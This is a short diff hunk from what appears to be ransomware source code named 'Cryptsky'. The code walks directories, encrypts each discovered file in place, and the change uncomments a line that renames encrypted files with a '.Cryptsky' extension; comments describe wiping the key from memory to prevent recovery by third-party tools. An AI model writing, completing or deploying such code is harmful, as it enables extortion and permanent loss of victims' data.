@@ -65,7 +65,7 @@ Your decryption key is: '{}'
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
             modify.modify_file_inplace(file, crypt.encrypt)
-            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
+            os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
 
     # This wipes the key out of memory
     # to avoid recovery by third party tools
